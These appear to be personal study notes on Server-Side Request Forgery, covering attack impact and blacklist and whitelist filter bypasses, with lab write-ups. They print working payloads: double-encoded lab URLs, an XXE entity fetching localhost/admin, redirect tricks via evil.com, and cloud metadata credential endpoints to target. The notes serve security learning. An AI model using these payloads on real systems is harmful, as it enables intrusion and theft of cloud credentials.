# SSRF — Notes

## What is SSRF?

SSRF (Server-Side Request Forgery) is when you trick a server into making requests on your behalf — to places it normally wouldn't or shouldn't reach.

Think of it like a waiter: you can't go into the kitchen yourself, but you can trick the waiter into fetching things from the kitchen for you — or even running errands outside the restaurant on your behalf.

---

## Impact of SSRF

### 1. Unauthorized Access to Internal Systems
The server lives inside the organization's network. Internal systems trust each other because they assume only authorized people can reach them. When you trick the server into making requests, you piggyback on its trusted position.

```
You (outside) → Vulnerable Server → Internal DB / Admin Panel / Secret API
                 (trusted insider)
```

### 2. Arbitrary Command Execution (OS Commands)
SSRF alone doesn't execute OS commands — but it's the doorway that lets you reach internal services that can.

Chain:
```
SSRF
  → reaches unprotected internal service
    → that service has command execution capability
      → OS commands run on the server
        → Full compromise
```

Classic example — cloud metadata endpoint:
```
http://169.254.169.254/latest/meta-data/
```
Fetch this → get cloud credentials → run commands on infrastructure.

Another example — internal Jenkins on port 8080 with no auth → has a "run script" feature → execute OS/Groovy commands.

### 3. Attack Third-Party Systems (Stay Hidden)
You can point the server outward — making it attack other companies. The attack looks like it came from the company's server, not from you.

```
You → Vulnerable Server → Attacks bank.com
              ↑
     Looks like the company did it
```

---

## Why Apps Trust Localhost Requests

### Reason 1 — Access Control is in a Different Component
Security check happens before the app server (in a firewall/proxy). When a request comes from localhost (127.0.0.1), it's already "inside" — the security checkpoint is never hit.

```
Internet → [Firewall checks ID] → App Server → Internal stuff
```
Security only watches the front door. Localhost bypasses it entirely.

### Reason 2 — Admin Access Without Login (Disaster Recovery)
Developers thought: "What if an admin gets locked out? Let's allow full access if the request comes from the local machine." Now an attacker can fake being "on the local machine" via SSRF and get free admin access with no password.

### Reason 3 — Admin Panel Runs on a Different Port
```
Main app:    yoursite.com:443   ← internet can reach
Admin panel: yoursite.com:8080 ← blocked from internet
```
The admin panel is hidden from the outside world by port blocking. But via SSRF:
```
You → trick server → server calls localhost:8080/admin → you're in
```

---

## SSRF Defenses and How to Bypass Them

### Blacklist-Based Filters

The app blocks strings like `127.0.0.1`, `localhost`, `/admin`. Bypass techniques:

**1. Alternative IP representations**
| Format | Value | Type |
|---|---|---|
| `127.0.0.1` | normal | Decimal |
| `2130706433` | same | Integer |
| `017700000001` | same | Octal |
| `127.1` | same | Shorthand |

**2. Register a domain that resolves to 127.0.0.1**
```
evil.com → DNS → 127.0.0.1
Blacklist checks: is "evil.com" blocked? No → allow
App fetches: evil.com → resolves to 127.0.0.1 → localhost reached
```

**3. URL Encoding / Case Variation**
```
localhost  →  locAlHost       (case variation)
/admin     →  %2fadmin        (URL encoded)
/admin     →  %2F%61%64%6D%69%6E  (fully encoded)
```

**4. Redirect Trick**
```
Step 1: Send → http://evil.com/redirect
Step 2: Blacklist checks evil.com → allowed
Step 3: evil.com redirects → http://127.0.0.1/admin
Step 4: Server follows redirect → bypassed
```
Extra trick: switch protocol during redirect (http → https) to bypass some filters.

---

### Whitelist-Based Filters

The app only allows URLs that match/contain a permitted value like `stock.weliketoshop.net`. Bypass techniques:

**1. @ credential embedding**
```
https://expected-host.com@evil-host.com
Filter reads: contains expected-host.com ✅
Server reads: username = expected-host.com, destination = evil-host.com
```

**2. # URL fragment**
```
https://evil-host.com#expected-host.com
Filter reads: contains expected-host.com ✅
Server reads: destination = evil-host.com, #expected-host.com = ignored
```

**3. Subdomain abuse**
```
https://expected-host.com.evil-host.com
Filter reads: starts with expected-host.com ✅
DNS resolves: to evil server
```

**4. URL Encoding**
Filter and server decode URLs differently — filter sees gibberish, server decodes to real path.

**5. Combining techniques**
```
https://expected-host.com@evil-host.com#expected-host.com
```

---

## SSRF Lab — Blacklist Filter Bypass

**Two blacklists in this lab:**

| What's blocked | Bypass |
|---|---|
| `127.0.0.1` (IP) | `127.1` (shorthand IP) |
| `/admin` (endpoint) | `/%2561dmin` (double URL encoded) |

**Why double encoding for `/admin`:**
```
a → %61 (encoded once)
%61 → %2561 (encoded twice)

Filter decodes once: %2561 → %61 (still gibberish, not "a") → allowed
Server decodes again: %61 → a → "/admin"
```

---

## SSRF Lab — Whitelist Filter Bypass

**Whitelist:** URL must contain `stock.weliketoshop.net`

**Bypass chain:**
```
Step 1: http://username@stock.weliketoshop.net/     ✅ accepted (@ trick works)
Step 2: http://username#@stock.weliketoshop.net/    ❌ # is recognized, blocked
Step 3: http://username%2523@stock.weliketoshop.net/ ⚠️ Internal Server Error (good sign!)
Step 4: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos  ✅ WIN
```

**How `%2523` works:**
```
# → %23 (encoded once)
%23 → %2523 (encoded twice)

Filter decodes %2523 → %23 (not #, still looks safe) → allowed
Server decodes %23 → # → reads localhost:80 as the actual host
```

**Final payload breakdown:**
```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
         ↑                    ↑
    real destination     satisfies whitelist
```

---

## SSRF Attack Surface — Where to Look

### Parameters That Sound Like URLs
```
url=, path=, dest=, redirect=, uri=, endpoint=, proxy=,
fetch=, load=, src=, source=, target=, link=, file=, page=
```

### App Features That Fetch External Content
| Feature | Why suspicious |
|---|---|
| PDF generators | Often fetch URLs to render content |
| Screenshot tools | Literally fetch URLs |
| File imports (XML, CSV) | Parser fetches external references |
| Webhooks | App makes outbound requests |
| "Preview this link" | App fetches URL to show preview |
| Image upload from URL | Server fetches the image URL |
| OAuth / SSO login | Makes server-to-server calls |

### Headers to Test
- `Referer` header — analytics software often fetches Referer URLs to analyze referring sites

### Data Formats (XXE → SSRF)
XML has a built-in feature to fetch external URLs. When the server parses XML with external entities, it makes the request — that's SSRF via XXE.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost/admin">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

### Partial URLs
Sometimes the app only gives you part of the URL:
- **Only hostname control** → can redirect host, but stuck with fixed path
- **Only path control** → can probe different endpoints, but stuck with fixed host

Still worth testing — just a smaller attack surface.

---

## Internal Targets to Test

### Always Try First
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
```

### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Common Internal Ports to Probe
```
127.0.0.1:22      → SSH
127.0.0.1:3306    → MySQL
127.0.0.1:6379    → Redis
127.0.0.1:8080    → Admin panel / Jenkins
127.0.0.1:27017   → MongoDB
```

### Common Internal IP Ranges
```
10.0.0.1
172.16.0.1
192.168.0.1
192.168.1.1
```

---

## Blind SSRF

Blind SSRF = the server makes the request but you can't see the response. You need an external server that logs incoming connections to confirm the attack.

### Tools
| Tool | Cost | Notes |
|---|---|---|
| Burp Collaborator | Burp Pro only | Built-in, easiest to use |
| interactsh | Free | Best free alternative, logs DNS + HTTP |
| webhook.site | Free | Simple HTTP logger |
| canarytokens.org | Free | Alerts on hit |
| requestbin.com | Free | HTTP request logger |

### Where to Inject (Blind SSRF)
- `Referer` header — analytics software visits URLs in the Referer
- Any URL parameter
- XML external entities

### Skipped Labs (Require Burp Collaborator)
- Blind SSRF with out-of-band detection
- Blind SSRF with Shellshock exploitation

Both can be done with interactsh as a free Collaborator alternative.

---

## How Blacklists vs Whitelists Compare

| | Blacklist | Whitelist |
|---|---|---|
| Logic | Block known bad | Allow only known good |
| Strength | Weak | Stronger |
| Bypass difficulty | Easy | Harder but still possible |
| Why weak | Too many ways to say the same thing | URL parsing inconsistencies |
